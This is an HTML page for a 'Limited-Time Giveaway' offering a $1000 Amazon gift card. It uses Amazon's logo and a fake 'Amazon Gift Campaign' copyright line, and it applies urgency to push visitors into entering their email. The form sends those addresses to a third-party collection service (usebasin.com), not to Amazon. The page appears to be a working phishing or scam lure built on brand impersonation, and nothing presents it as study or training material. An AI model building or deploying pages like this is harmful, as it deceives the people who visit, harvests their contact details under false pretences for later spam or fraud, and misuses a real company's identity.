<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Amazon Gift Card</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #e8f3f3;
    }

    header {
      background-color: #012d47;
      color: white;
      padding: 16px;
      text-align: center;
      font-size: 22px;
      font-weight: 600;
    }

    .container {
      max-width: 400px;
      background: white;
      margin: 40px auto;
      padding: 30px;
      border-radius: 14px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
      text-align: center;
    }

    h1 {
      color: #cc8800;
      font-size: 20px;
      margin-bottom: 12px;
    }

    p {
      color: #333;
      font-size: 14px;
      margin-bottom: 20px;
    }

    img {
      width: 100%;
      border-radius: 10px;
      margin-bottom: 20px;
    }

    input, button {
      width: 100%;
      padding: 14px;
      margin-top: 10px;
      border-radius: 6px;
      border: 1px solid #ccc;
      font-size: 16px;
    }

    button {
      background-color: #e48c00;
      color: white;
      border: none;
      font-weight: 600;
    }

    button:hover {
      background-color: #cc7a00;
    }

    footer {
      text-align: center;
      font-size: 12px;
      color: #666;
      margin-top: 30px;
      padding-bottom: 20px;
    }
  </style>
</head>
<body>

  <header>Limited-Time Giveaway</header>

  <div class="container">
    <h1>Win a $1000 Amazon Gift Card!</h1>
    <p>Enter your email below and claim your chance. This offer won't last long!</p>

    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Gift Card" />

    <form action="https://usebasin.com/f/9dab7cafe892" method="POST">
      <input type="email" name="email" placeholder="Enter your email" required>
      <input type="hidden" name="redirect" value="thankyou.html">
      <button type="submit">Claim Now</button>
    </form>
  </div>

  <footer>
    © 2025 Amazon Gift Campaign. All rights reserved.
  </footer>

</body>
</html>
